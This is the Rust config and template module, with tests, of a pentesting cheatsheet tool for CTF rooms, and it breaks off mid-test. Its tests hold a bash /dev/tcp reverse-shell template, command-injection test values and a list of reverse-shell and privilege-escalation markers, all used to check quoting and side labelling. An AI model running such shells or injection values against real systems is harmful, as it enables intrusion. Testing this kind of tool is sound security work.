use serde::{Deserialize, Serialize};
use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

/// A single cheatsheet command/template.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Command {
    pub category: String,
    pub name: String,
    #[serde(default)]
    pub description: String,
    pub template: String,
    #[serde(default)]
    pub tags: Vec<String>,
    /// Optional multi-step playbook: each entry runs in its own tab.
    /// `template` stays the primary/copyable line; `steps` drives the runner.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub steps: Vec<String>,
    /// Where the command is meant to run. `target` = on the victim (reverse
    /// shells, privesc enum, download one-liners): pivt copies it but never
    /// runs it locally with `x`.
    #[serde(default, skip_serializing_if = "Side::is_local")]
    pub side: Side,
    /// Run in a raw PTY (listeners): Ctrl-C/Ctrl-Z go to the remote shell as
    /// bytes instead of killing/stopping the local listener.
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    pub raw_pty: bool,
    /// Programs this command needs, overriding the guess from the template's
    /// first word (`requires = ["impacket-secretsdump"]`).
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub requires: Vec<String>,
    /// true if it came from the user's commands.toml (editable/removable)
    #[serde(skip)]
    pub user: bool,
}

/// Which machine a command is meant to run on.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Side {
    /// Your own box (the default).
    #[default]
    #[serde(alias = "attacker")]
    Local,
    /// The victim: paste it into a shell on the box.
    #[serde(alias = "victim")]
    Target,
}

impl Side {
    pub fn is_local(&self) -> bool {
        *self == Side::Local
    }
}

/// Status shown when `x` (or a recipe) refuses a target-side command.
pub const TARGET_SIDE_MSG: &str = "target-side: copy it (⏎) and run it in your shell on the box";

/// Prefix that puts the job's PTY in raw mode so control keys reach the
/// remote shell. `icrnl` keeps Enter working in a not-yet-upgraded shell.
pub const RAW_PTY_PREFIX: &str = "stty raw -echo icrnl 2>/dev/null; ";

impl Command {
    pub fn is_target(&self) -> bool {
        self.side == Side::Target
    }

    /// Wrap an already-filled step for the runner (raw PTY for listeners).
    pub fn wrap_for_run(&self, filled: &str) -> String {
        if self.raw_pty {
            format!("{RAW_PTY_PREFIX}{filled}")
        } else {
            filled.to_string()
        }
    }

    /// Lines to run: the explicit `steps`, else the single `template`.
    pub fn run_steps(&self) -> Vec<String> {
        if self.steps.is_empty() {
            vec![self.template.clone()]
        } else {
            self.steps.clone()
        }
    }
}

#[derive(Debug, Default, Deserialize)]
struct CommandFile {
    #[serde(default, rename = "command")]
    commands: Vec<Command>,
}

#[derive(Debug, Default, Serialize)]
struct CommandFileOut<'a> {
    #[serde(rename = "command")]
    commands: Vec<&'a Command>,
}

/// The official pivt Discord application (name "pivt", art asset `pivt`).
/// Project home; default target of the "get pivt" presence button.
pub const REPO_URL: &str = "https://github.com/Th7bo/pivt";
pub const DEFAULT_DISCORD_APP_ID: &str = "1574922609542303924";

/// Config = the persisted variable values.
// NOTE: array fields are declared BEFORE `vars` so toml serializes them first;
// a TOML table must come after top-level keys or those keys nest under it.
#[derive(Debug, Default, Serialize, Deserialize)]
pub struct Config {
    /// Pinned command keys ("category/name").
    #[serde(default)]
    pub favorites: Vec<String>,
    /// Recently copied/run command keys, most-recent first.
    #[serde(default)]
    pub recent: Vec<String>,
    /// Background style: true = flowing ASCII field, false = starfield.
    #[serde(default)]
    pub flow_bg: bool,
    /// Hide commands whose tools aren't installed (`m`).
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    pub hide_missing: bool,
    /// Colour theme by name (a preset or a file in ~/.config/pivt/themes/).
    /// A string so an unknown name falls back to the default instead of
    /// failing the parse; empty = default.
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub theme: String,
    /// Enable Discord Rich Presence (opt-in).
    #[serde(default)]
    pub discord_rpc: bool,
    /// Discord application (client) id for Rich Presence; empty = use the
    /// bundled pivt app ([`DEFAULT_DISCORD_APP_ID`]).
    #[serde(default)]
    pub discord_app_id: String,
    /// URL for the "get pivt" presence button; empty = [`REPO_URL`].
    #[serde(default)]
    pub discord_link: String,
    /// How much the presence reveals: "safe" (default), "full" or "minimal".
    /// A string so a typo falls back to safe instead of failing the parse.
    #[serde(default)]
    pub discord_privacy: String,
    /// Where rooms live; empty = $CTF_ROOT, else ~/TryHackMe if it exists,
    /// else $XDG_DATA_HOME/pivt/rooms. `$CTF_ROOT` beats this setting.
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub rooms_dir: String,
    /// File copied into every new room. Unset = the legacy
    /// ~/.config/zsh/ctf-cheatsheet.md when it exists; "" = copy nothing.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub room_template: Option<String>,
    /// File RHOST is mirrored into for shell integrations. Unset =
    /// ~/.cache/ctf-target, but only if that file already exists; "" = off.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub sync_target_file: Option<String>,
    /// What running against a host outside the room's scope does: "warn",
    /// "confirm" (default) or "strict". A string so an unknown value falls
    /// back to confirm instead of failing the parse.
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub scope_mode: String,
    #[serde(default)]
    pub vars: BTreeMap<String, String>,
    /// Custom keybindings (`[keys]`: action = "key" | ["key", …]). Kept as a
    /// raw table so junk values are skipped with a warning instead of failing
    /// the whole parse; see [`crate::keys`]. Tables go after every scalar
    /// field, and it's only written when the user set something.
    #[serde(default, skip_serializing_if = "toml::Table::is_empty")]
    pub keys: toml::Table,
    /// `[layout]`: pane sizes / visibility, header items, compact mode. Raw
    /// like `[keys]`, see [`crate::prefs`]; only what the user set is saved.
    #[serde(default, skip_serializing_if = "toml::Table::is_empty")]
    pub layout: toml::Table,
    /// `[look]`: background, splash, animations, borders, glyphs, and
    /// `[look.categories]` glyph/colour overrides. Raw, like `[layout]`.
    #[serde(default, skip_serializing_if = "toml::Table::is_empty")]
    pub look: toml::Table,
}

/// Write a file only its owner can read (0600), tightening an existing one.
/// For anything holding credentials or command output.
pub fn write_private(path: &Path, contents: impl AsRef<[u8]>) -> std::io::Result<()> {
    use std::io::Write;
    let mut f = private_options().write(true).truncate(true).open(path)?;
    restrict(path, 0o600)?;
    f.write_all(contents.as_ref())
}

/// `OpenOptions` that create files as 0600 (append/write left to the caller).
pub fn private_options() -> std::fs::OpenOptions {
    let mut o = std::fs::OpenOptions::new();
    o.create(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        o.mode(0o600);
    }
    o
}

/// `create_dir_all`, then make the leaf directory owner-only (0700).
pub fn create_private_dir(dir: &Path) -> std::io::Result<()> {
    std::fs::create_dir_all(dir)?;
    restrict(dir, 0o700)
}

/// chmod `path` to `mode` if it is looser (no-op when missing or non-unix).
pub fn restrict(path: &Path, mode: u32) -> std::io::Result<()> {
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        match std::fs::metadata(path) {
            Ok(m) if m.permissions().mode() & 0o777 & !mode != 0 => {
                std::fs::set_permissions(path, std::fs::Permissions::from_mode(mode))?
            }
            _ => {}
        }
    }
    #[cfg(not(unix))]
    let _ = (path, mode);
    Ok(())
}

pub fn config_dir() -> PathBuf {
    dirs::config_dir()
        .unwrap_or_else(|| PathBuf::from("."))
        .join("pivt")
}

pub fn config_file() -> PathBuf {
    config_dir().join("config.toml")
}

pub fn user_commands_file() -> PathBuf {
    config_dir().join("commands.toml")
}

/// `~` / `~/…` → under `home`; anything else as given.
pub fn expand_home(s: &str, home: &Path) -> PathBuf {
    if s == "~" {
        home.to_path_buf()
    } else if let Some(rest) = s.strip_prefix("~/") {
        home.join(rest)
    } else {
        PathBuf::from(s)
    }
}

/// Filesystem locations that depend on config + environment, resolved once
/// at startup.
#[derive(Debug, Clone)]
pub struct Paths {
    /// Holds every room (`<rooms_dir>/<name>/.ctfroom`).
    pub rooms_dir: PathBuf,
    /// Copied into new rooms, if any.
    pub room_template: Option<PathBuf>,
    /// RHOST mirror for shell functions, if enabled.
    pub target_file: Option<PathBuf>,
}

impl Paths {
    pub fn from_config(cfg: &Config) -> Paths {
        let home = dirs::home_dir().unwrap_or_else(|| PathBuf::from("."));
        let data = dirs::data_dir().unwrap_or_else(|| home.join(".local/share"));
        let env_root = std::env::var_os("CTF_ROOT");
        Paths {
            rooms_dir: resolve_rooms_dir(env_root.as_deref(), &cfg.rooms_dir, &home, &data),
            room_template: resolve_room_template(cfg.room_template.as_deref(), &home),
            target_file: resolve_target_file(cfg.sync_target_file.as_deref(), &home, &default_target_file(&home)),
        }
    }
}

/// Rooms dir: `$CTF_ROOT`, else config `rooms_dir`, else `~/TryHackMe` when
/// that directory already exists (pre-config installs), else
/// `<data_dir>/pivt/rooms`.
pub fn resolve_rooms_dir(env: Option<&std::ffi::OsStr>, cfg: &str, home: &Path, data_dir: &Path) -> PathBuf {
    if let Some(e) = env.filter(|e| !e.is_empty()) {
        return PathBuf::from(e);
    }
    if !cfg.trim().is_empty() {
        return expand_home(cfg.trim(), home);
    }
    let legacy = home.join("TryHackMe");
    if legacy.is_dir() {
        return legacy;
    }
    data_dir.join("pivt").join("rooms")
}

/// The pre-config default template (the author's zsh kit cheatsheet).
pub fn legacy_room_template(home: &Path) -> PathBuf {
    home.join(".config/zsh/ctf-cheatsheet.md")
}

/// Template copied into new rooms: the configured file, nothing for "", or
/// the legacy cheatsheet only when it exists.
pub fn resolve_room_template(cfg: Option<&str>, home: &Path) -> Option<PathBuf> {
    match cfg.map(str::trim) {
        Some("") => None,
        Some(p) => Some(expand_home(p, home)),
        None => Some(legacy_room_template(home)).filter(|p| p.is_file()),
    }
}

/// ~/.cache/ctf-target (honoring XDG_CACHE_HOME): the file the author's zsh
/// `target` function reads.
pub fn default_target_file(home: &Path) -> PathBuf {
    std::env::var_os("XDG_CACHE_HOME")
        .filter(|v| !v.is_empty())
        .map(PathBuf::from)
        .unwrap_or_else(|| home.join(".cache"))
        .join("ctf-target")
}

/// RHOST mirror: the configured path, off for "", or `default` only when it
/// already exists (so existing shell setups keep working and new installs
/// don't grow a stray cache file).
pub fn resolve_target_file(cfg: Option<&str>, home: &Path, default: &Path) -> Option<PathBuf> {
    match cfg.map(str::trim) {
        Some("") => None,
        Some(p) => Some(expand_home(p, home)),
        None => Some(default.to_path_buf()).filter(|p| p.exists()),
    }
}

pub fn read_ctf_target(path: &Path) -> Option<String> {
    let s = std::fs::read_to_string(path).ok()?;
    let s = s.trim().to_string();
    if s.is_empty() {
        None
    } else {
        Some(s)
    }
}

/// Mirror RHOST into the shared target file so `target`/$TARGET see it too.
pub fn write_ctf_target(path: &Path, ip: &str) {
    if ip.is_empty() {
        return;
    }
    if let Some(dir) = path.parent() {
        let _ = std::fs::create_dir_all(dir);
    }
    let _ = std::fs::write(path, format!("{ip}\n"));
}

/// Bundled default cheatsheet, compiled into the binary.
const BUNDLED: &str = include_str!("default_commands.toml");

/// Load bundled commands then merge/override with the user's file.
/// A user command with the same (category,name) overrides a bundled one.
pub fn load_commands() -> Vec<Command> {
    let mut out: Vec<Command> = parse_commands(BUNDLED, false);

    let path = user_commands_file();
    if let Ok(txt) = std::fs::read_to_string(&path) {
        let user = parse_commands(&txt, true);
        for uc in user {
            if let Some(slot) = out
                .iter_mut()
                .find(|c| c.category == uc.category && c.name == uc.name)
            {
                *slot = uc;
            } else {
                out.push(uc);
            }
        }
    }
    out
}

/// The bundled commands only (for tests that cross-check bundled data).
#[cfg(test)]
pub fn load_bundled_for_tests() -> Vec<Command> {
    parse_commands(BUNDLED, false)
}

fn parse_commands(txt: &str, user: bool) -> Vec<Command> {
    match toml::from_str::<CommandFile>(txt) {
        Ok(f) => f
            .commands
            .into_iter()
            .map(|mut c| {
                c.user = user;
                c
            })
            .collect(),
        Err(_) => Vec::new(),
    }
}

/// Persist all user commands to commands.toml.
pub fn save_user_commands(all: &[Command]) -> std::io::Result<()> {
    std::fs::create_dir_all(config_dir())?;
    let users: Vec<&Command> = all.iter().filter(|c| c.user).collect();
    let out = CommandFileOut { commands: users };
    let txt = toml::to_string_pretty(&out)
        .unwrap_or_default();
    std::fs::write(user_commands_file(), txt)
}

pub fn load_config() -> Config {
    // holds USER/PASS/HASH: tighten a file left world-readable by older pivt
    let _ = restrict(&config_file(), 0o600);
    if let Ok(txt) = std::fs::read_to_string(config_file()) {
        toml::from_str(&txt).unwrap_or_default()
    } else {
        Config::default()
    }
}

pub fn save_config(cfg: &Config) -> std::io::Result<()> {
    create_private_dir(&config_dir())?;
    let txt = toml::to_string_pretty(cfg).unwrap_or_default();
    write_private(&config_file(), txt)
}

/// Extract `<PLACEHOLDER>` tokens (UPPERCASE / digits / underscore) from a template,
/// preserving first-seen order, de-duplicated.
pub fn extract_placeholders(template: &str) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    let bytes = template.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'<' {
            if let Some(close) = template[i + 1..].find('>') {
                let inner = &template[i + 1..i + 1 + close];
                if !inner.is_empty()
                    && inner
                        .chars()
                        .all(|c| c.is_ascii_uppercase() || c.is_ascii_digit() || c == '_')
                {
                    let s = inner.to_string();
                    if !out.contains(&s) {
                        out.push(s);
                    }
                    i = i + 1 + close + 1;
                    continue;
                }
            }
        }
        i += 1;
    }
    out
}

/// Fill a template from the vars map. Empty/missing vars keep the `<NAME>` marker
/// so the user can see what's still unset.
///
/// Templates are POSIX `sh` command lines, so every substituted value is
/// shell-quoted for the spot it lands in: a value can never end a quote early,
/// split into several words, or start a `$(…)` / `;` of its own. Values made
/// only of "safe" characters (IPs, ports, plain paths, URLs without `&`/`?`)
/// are inserted as-is so the result stays readable.
pub fn fill_template(template: &str, vars: &BTreeMap<String, String>) -> String {
    let mut out = String::with_capacity(template.len() + 16);
    let mut ctx = Quote::None;
    let mut rest = template;
    while let Some(c) = rest.chars().next() {
        if c == '<' {
            if let Some((name, after)) = placeholder_at(rest) {
                match vars.get(name).filter(|v| !v.is_empty()) {
                    Some(v) => out.push_str(&quote_for(v, ctx)),
                    None => {
                        out.push('<');
                        out.push_str(name);
                        out.push('>');
                    }
                }
                rest = after;
                continue;
            }
        }
        let len = c.len_utf8();
        match (ctx, c) {
            (Quote::None, '\\') | (Quote::Double, '\\') => {
                // an escape: copy it together with the char it escapes
                let n = rest[len..].chars().next().map_or(0, char::len_utf8);
                out.push_str(&rest[..len + n]);
                rest = &rest[len + n..];
                continue;
            }
            (Quote::None, '\'') => ctx = Quote::Single,
            (Quote::None, '"') => ctx = Quote::Double,
            (Quote::Single, '\'') | (Quote::Double, '"') => ctx = Quote::None,
            _ => {}
        }
        out.push(c);
        rest = &rest[len..];
    }
    out
}

/// The shell quoting context at some point in a command line.
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
enum Quote {
    None,
    Single,
    Double,
}

/// `<NAME>` at the start of `s`: (NAME, text after the `>`).
fn placeholder_at(s: &str) -> Option<(&str, &str)> {
    let body = s.strip_prefix('<')?;
    let close = body.find('>')?;
    let name = &body[..close];
    let ok = !name.is_empty()
        && name.chars().all(|c| c.is_ascii_uppercase() || c.is_ascii_digit() || c == '_');
    ok.then(|| (name, &body[close + 1..]))
}

/// Characters that never need quoting in `sh` (anywhere in a word).
fn shell_safe(v: &str) -> bool {
    !v.is_empty()
        && v.chars().all(|c| c.is_ascii_alphanumeric() || "_@%+=:,./-".contains(c))
}

/// POSIX single-quote `v` as one word: `it's` → `'it'\''s'`.
pub fn shell_quote(v: &str) -> String {
    if shell_safe(v) {
        return v.to_string();
    }
    format!("'{}'", v.replace('\'', "'\\''"))
}

/// Render `v` so it reads back literally inside quoting context `ctx`.
fn quote_for(v: &str, ctx: Quote) -> String {
    match ctx {
        Quote::None => match v.strip_prefix("~/") {
            // keep `~/` expandable (WORDLIST=~/lists/x.txt), quote the rest
            Some(rest) if !rest.is_empty() => format!("~/{}", shell_quote(rest)),
            _ => shell_quote(v),
        },
        // inside '…': close, emit an escaped quote, reopen
        Quote::Single => v.replace('\'', "'\\''"),
        // inside "…": only \ " $ ` are special
        Quote::Double => {
            let mut s = String::with_capacity(v.len());
            for c in v.chars() {
                if matches!(c, '\\' | '"' | '$' | '`') {
                    s.push('\\');
                }
                s.push(c);
            }
            s
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::BTreeMap;

    #[test]
    fn placeholders_extract_in_order_dedup() {
        let t = "nc <LHOST> <LPORT> < <FILE> # <LHOST>";
        assert_eq!(extract_placeholders(t), vec!["LHOST", "LPORT", "FILE"]);
    }

    #[test]
    fn fill_keeps_unset_marker() {
        let mut v = BTreeMap::new();
        v.insert("LHOST".to_string(), "10.10.14.5".to_string());
        v.insert("LPORT".to_string(), "".to_string());
        let out = fill_template("bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1", &v);
        assert_eq!(out, "bash -i >& /dev/tcp/10.10.14.5/<LPORT> 0>&1");
    }


    const HOSTILE: &[&str] = &["a'b", "$(id)", "x;y", "a b", "\"q\"", "`id`&|<>*?~\\#!"];

    /// Every placeholder of every bundled template/step, filled with `v`.
    fn fill_all(c: &Command, v: &str) -> Vec<String> {
        c.run_steps()
            .iter()
            .chain(std::iter::once(&c.template))
            .map(|t| {
                let vars = extract_placeholders(t).into_iter().map(|p| (p, v.to_string())).collect();
                fill_template(t, &vars)
            })
            .collect()
    }

    fn sh_syntax_ok(cmd: &str) -> Result<(), String> {
        let out = std::process::Command::new("sh").args(["-n", "-c", cmd]).output().unwrap();
        if out.status.success() {
            Ok(())
        } else {
            Err(String::from_utf8_lossy(&out.stderr).into_owned())
        }
    }

    /// The words `sh` would pass to the command, without running it: `set --`
    /// only assigns them. Only used on templates without operators/expansions.
    fn sh_words(cmd: &str) -> Vec<String> {
        let script = format!("set -- {cmd}\nprintf '%s\\0' \"$@\"");
        let out = std::process::Command::new("sh").args(["-c", &script]).output().unwrap();
        assert!(out.status.success(), "{cmd}: {}", String::from_utf8_lossy(&out.stderr));
        let mut words: Vec<String> =
            String::from_utf8_lossy(&out.stdout).split('\0').map(String::from).collect();
        words.pop();
        words
    }

    /// No shell operators, redirections or expansions outside quotes.
    fn plain_simple_command(t: &str) -> bool {
        let mut ctx = Quote::None;
        let mut rest = t;
        while let Some(c) = rest.chars().next() {
            if let Some((_, after)) = placeholder_at(rest) {
                rest = after;
                continue;
            }
            let mut len = c.len_utf8();
            match (ctx, c) {
                (Quote::None, '\\') => len += rest[1..].chars().next().map_or(0, char::len_utf8),
                (Quote::None, '\'') => ctx = Quote::Single,
                (Quote::None, '"') => ctx = Quote::Double,
                (Quote::Single, '\'') | (Quote::Double, '"') => ctx = Quote::None,
                (Quote::None, '|' | '&' | ';' | '<' | '>' | '`' | '$' | '(' | ')' | '*' | '?' | '~' | '#') => return false,
                (Quote::Double, '$' | '`') => return false,
                _ => {}
            }
            rest = &rest[len..];
        }
        true
    }

    #[test]
    fn hostile_values_keep_every_bundled_template_valid_sh() {
        let all = parse_commands(BUNDLED, false);
        for c in &all {
            for v in HOSTILE {
                for filled in fill_all(c, v) {
                    if let Err(e) = sh_syntax_ok(&filled) {
                        panic!("{}/{} with {v:?}:\n{filled}\n{e}", c.category, c.name);
                    }
                }
            }
        }
    }

    #[test]
    fn hostile_values_round_trip_as_literal_words() {
        // For every bundled template that is a plain simple command, a hostile
        // value must not add or remove words, and must appear literally.
        let all = parse_commands(BUNDLED, false);
        let mut checked = 0;
        for c in &all {
            for t in c.run_steps().iter().chain(std::iter::once(&c.template)) {
                if extract_placeholders(t).is_empty() || !plain_simple_command(t) {
                    continue;
                }
                let fill = |v: &str| {
                    let vars = extract_placeholders(t).into_iter().map(|p| (p, v.to_string())).collect();
                    fill_template(t, &vars)
                };
                let base = sh_words(&fill("PIVTX"));
                for v in HOSTILE {
                    let got = sh_words(&fill(v));
                    assert_eq!(got.len(), base.len(), "{}/{} {v:?}: {got:?}", c.category, c.name);
                    for (g, b) in got.iter().zip(&base) {
                        assert_eq!(*g, b.replace("PIVTX", v), "{}/{} {v:?}", c.category, c.name);
                    }
                }
                checked += 1;
            }
        }
        assert!(checked > 50, "only {checked} templates checked");
    }

    #[test]
    fn quoting_per_context_reads_back_literally() {
        // contexts that the bundled set uses, checked by actually printing the
        // words (printf only; a broken quote would run `id`, harmlessly)
        let templates = [
            "printf '[%s]' <V>",
            "printf '[%s]' pre<V>post",
            "printf '[%s]' 'in <V> side'",
            "printf '[%s]' \"in <V> side\"",
            "printf '[%s]' -p<V>",
            "printf '[%s]' <V>:<V>@host",
        ];
        for v in HOSTILE.iter().chain(&["plain", "it's", "\\", "'"]) {
            for t in templates {
                let mut vars = BTreeMap::new();
                vars.insert("V".to_string(), v.to_string());
                let filled = fill_template(t, &vars);
                let out = std::process::Command::new("sh").args(["-c", &filled]).output().unwrap();
                let shown = String::from_utf8_lossy(&out.stdout).into_owned();
                let want_v = v.to_string();
                let want = match t {
                    t if t.ends_with(" <V>") => format!("[{want_v}]"),
                    t if t.contains("pre<V>") => format!("[pre{want_v}post]"),
                    t if t.contains("-p<V>") => format!("[-p{want_v}]"),
                    t if t.contains(":<V>") => format!("[{want_v}:{want_v}@host]"),
                    _ => format!("[in {want_v} side]"),
                };
                assert_eq!(shown, want, "template {t:?} value {v:?} → {filled}");
            }
        }
    }

    #[test]
    fn safe_values_stay_readable() {
        let mut v = BTreeMap::new();
        v.insert("RHOST".to_string(), "10.10.11.5".to_string());
        v.insert("URL".to_string(), "http://10.10.11.5:8080/a-b_c".to_string());
        v.insert("PASS".to_string(), "P@ss w0rd!".to_string());
        assert_eq!(fill_template("curl <URL> -x <RHOST>", &v), "curl http://10.10.11.5:8080/a-b_c -x 10.10.11.5");
        assert_eq!(fill_template("x -p <PASS>", &v), "x -p 'P@ss w0rd!'");
        assert_eq!(fill_template("x -p '<PASS>'", &v), "x -p 'P@ss w0rd!'");
        assert_eq!(shell_quote("it's"), "'it'\\''s'");
        // a leading ~/ stays expandable, the rest is quoted
        v.insert("WORDLIST".to_string(), "~/my lists/r.txt".to_string());
        assert_eq!(fill_template("ffuf -w <WORDLIST>", &v), "ffuf -w ~/'my lists/r.txt'");
    }

    #[test]
    fn config_roundtrip_order() {
        let mut c = Config::default();
        c.favorites.push("nmap/Quick".into());
        c.recent.push("web/ffuf".into());
        c.vars.insert("RHOST".into(), "10.0.0.1".into());
        let txt = toml::to_string_pretty(&c).unwrap();
        // arrays must appear before the [vars] table
        let fav_pos = txt.find("favorites").unwrap();
        let vars_pos = txt.find("[vars]").unwrap();
        assert!(fav_pos < vars_pos, "bad order:\n{txt}");
        let back: Config = toml::from_str(&txt).unwrap();
        assert_eq!(back.favorites, vec!["nmap/Quick".to_string()]);
        assert_eq!(back.vars.get("RHOST").unwrap(), "10.0.0.1");
    }

    #[test]
    fn config_keys_table_roundtrip_and_order() {
        // no [keys] in a default config
        let txt = toml::to_string_pretty(&Config::default()).unwrap();
        assert!(!txt.contains("keys"), "{txt}");
        let src = "theme = \"nord\"\nscope_mode = \"strict\"\n[keys]\nrun = \"X\"\nhistory = [\"y\", \"ctrl-r\"]\ndetach = [\"f12\", \"ctrl-]\"]\n[vars]\nRHOST = \"10.0.0.1\"\n";
        let mut c: Config = toml::from_str(src).unwrap();
        c.favorites.push("nmap/Quick".into());
        let txt = toml::to_string_pretty(&c).unwrap();
        let keys_pos = txt.find("[keys]").expect(&txt);
        for scalar in ["favorites", "theme", "scope_mode", "flow_bg"] {
            assert!(txt.find(scalar).unwrap() < keys_pos, "{scalar} after [keys]:\n{txt}");
        }
        let back: Config = toml::from_str(&txt).unwrap();
        assert_eq!(back.keys, c.keys);
        assert_eq!(back.theme, "nord");
        assert_eq!(back.vars["RHOST"], "10.0.0.1");
        let (m, w) = crate::keys::Keymap::from_config(&back.keys);
        assert!(w.is_empty(), "{w:?}");
        assert_eq!(m.label(crate::keys::Action::Run), "X");
        assert_eq!(m.label(crate::keys::Action::History), "y / ^r");
    }

    #[test]
    fn config_layout_look_roundtrip_and_order() {
        // nothing written for a default config
        let txt = toml::to_string_pretty(&Config::default()).unwrap();
        assert!(!txt.contains("layout") && !txt.contains("look"), "{txt}");
        let src = "theme = \"nord\"\n[layout]\ncompact = true\ncategories_width = 999\n[look]\nborder = \"thick\"\nbogus = \"x\"\n[look.categories]\nweb = { glyph = \"W\", color = \"ok\" }\n[vars]\nRHOST = \"10.0.0.1\"\n";
        let mut c: Config = toml::from_str(src).unwrap();
        c.favorites.push("nmap/Quick".into());
        let txt = toml::to_string_pretty(&c).unwrap();
        let first_table = ["[layout]", "[look]", "[vars]"].iter().filter_map(|t| txt.find(t)).min().expect(&txt);
        for scalar in ["favorites", "theme", "flow_bg"] {
            assert!(txt.find(scalar).unwrap() < first_table, "{scalar} after a table:\n{txt}");
        }
        let back: Config = toml::from_str(&txt).unwrap();
        // written back exactly as the user had it: junk + out-of-range kept, no defaults added
        assert_eq!(back.layout, c.layout);
        assert_eq!(back.look, c.look);
        assert_eq!(back.layout.len(), 2);
        assert_eq!(back.look["bogus"].as_str(), Some("x"));
        assert!(!txt.contains("show_preview") && !txt.contains("animations"), "{txt}");
        let (p, w) = crate::prefs::Prefs::load(&back.layout, &back.look, back.flow_bg);
        assert!(p.compact && p.categories_width == 40 && p.border == crate::prefs::Border::Thick);
        assert_eq!(w.len(), 2, "{w:?}"); // clamp + unknown key
        let (cats, w) = crate::prefs::parse_categories(&back.look);
        assert!(w.is_empty() && cats[0].glyph == Some('W'));
    }

    #[test]
    fn config_theme_string_never_breaks_parse() {
        let mut c = Config::default();
        c.theme = "tokyo night".into();
        c.vars.insert("RHOST".into(), "10.0.0.1".into());
        let txt = toml::to_string_pretty(&c).unwrap();
        assert!(txt.find("theme = \"tokyo night\"").unwrap() < txt.find("[vars]").unwrap(), "{txt}");
        // an unknown theme still parses (and resolves to the default later)
        let back: Config = toml::from_str("theme = \"no-such\"\nflow_bg = true\n[vars]\nRHOST = \"x\"").unwrap();
        assert_eq!(back.theme, "no-such");
        assert!(back.flow_bg);
        assert_eq!(crate::theme::resolve(&back.theme).name, "pivt");
        // a default config doesn't write the key at all
        assert!(!toml::to_string_pretty(&Config::default()).unwrap().contains("theme"));
    }

    #[test]
    fn bundled_victim_commands_are_target_side() {
        let all = parse_commands(BUNDLED, false);
        let key = |c: &Command| format!("{}/{}", c.category, c.name);
        // whole categories that only make sense inside a shell on the box
        for c in all.iter().filter(|c| ["upgrade", "win"].contains(&c.category.as_str())) {
            assert!(c.is_target(), "{} should be side = \"target\"", key(c));
        }
        // shells: everything that connects back to LHOST is a payload
        // (msfvenom only builds one locally)
        for c in all.iter().filter(|c| c.category == "shells") {
            let payload = c.template.contains("<LHOST>") && !c.template.starts_with("msfvenom");
            assert_eq!(c.is_target(), payload, "{} side", key(c));
        }
        // anything that looks like a payload, privesc enum or a victim-side pull
        let victim = [
            "/dev/tcp/", "mkfifo", "-e /bin/sh", "pty.spawn", "linpeas", "winPEAS", "sudo -l",
            "-perm -4000", "find / -writable", "certutil", "Invoke-WebRequest", "iwr ", "fsockopen",
            "TCPClient", "wget http://<LHOST>", "curl http://<LHOST>",
        ];
        for c in &all {
            let t = c.run_steps().join("\n");
            if victim.iter().any(|v| t.contains(v)) {
                assert!(c.is_target(), "{} looks victim-side but isn't marked", key(c));
            }
        }
        // listeners stay local and get a raw PTY
        for name in ["nc listener", "rlwrap listener"] {
            let c = all.iter().find(|c| c.category == "shells" && c.name == name).unwrap();
            assert!(!c.is_target() && c.raw_pty, "{name}");
            assert!(c.description.contains("penelope") && c.description.contains("pwncat"));
        }
        // and the attacker basics are still runnable
        for k in ["nmap/Quick top-ports", "transfer/python http server", "pivot/chisel server", "misc/add /etc/hosts"] {
            let c = all.iter().find(|c| key(c) == k).unwrap();
            assert!(!c.is_target(), "{k}");
        }
    }

    #[test]
    fn side_parses_and_roundtrips() {
        let txt = r#"
[[command]]
category = "x"
name = "a"
template = "id"
side = "target"

[[command]]
category = "x"
name = "b"
template = "id"
side = "attacker"

[[command]]
category = "x"
name = "c"
template = "nc -lvnp 1"
raw_pty = true
"#;
        let mut cs = parse_commands(txt, true);
        assert_eq!(cs.iter().map(|c| c.side).collect::<Vec<_>>(), vec![Side::Target, Side::Local, Side::Local]);
        assert!(cs[2].raw_pty && !cs[0].raw_pty);
        assert_eq!(cs[2].wrap_for_run("nc -lvnp 1"), format!("{RAW_PTY_PREFIX}nc -lvnp 1"));
        assert_eq!(cs[0].wrap_for_run("id"), "id");
        // serialized form keeps target/raw_pty, omits defaults
        cs[1].side = Side::Local;
        let out = toml::to_string_pretty(&CommandFileOut { commands: cs.iter().collect() }).unwrap();
        assert_eq!(out.matches("side = \"target\"").count(), 1, "{out}");
        assert_eq!(out.matches("raw_pty = true").count(), 1, "{out}");
        assert!(!out.contains("local"), "{out}");
        let back = parse_commands(&out, true);
        assert!(back[0].is_target() && back[2].raw_pty);
    }

    #[test]
    fn bundled_has_no_stale_literals() {
        for c in parse_commands(BUNDLED, false) {
            let t = c.run_steps().join("\n") + &c.template;
            for bad in ["YOUR_", "tun0", "crackmapexec", "-p '<PASS>'", "'<PASS>'", "'<USER>"] {
                assert!(!t.contains(bad), "{}/{} contains {bad:?}: {t}", c.category, c.name);
            }
        }
        let recipes = include_str!("default_recipes.toml");
        assert!(!recipes.contains("crackmapexec"));
    }

    #[cfg(unix)]
    #[test]
    fn private_files_and_dirs() {
        use std::os::unix::fs::PermissionsExt;
        let mode = |p: &Path| std::fs::metadata(p).unwrap().permissions().mode() & 0o777;
        let d = std::env::temp_dir().join(format!("pivt-perm-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        // an existing loose dir + file get tightened
        std::fs::create_dir_all(&d).unwrap();
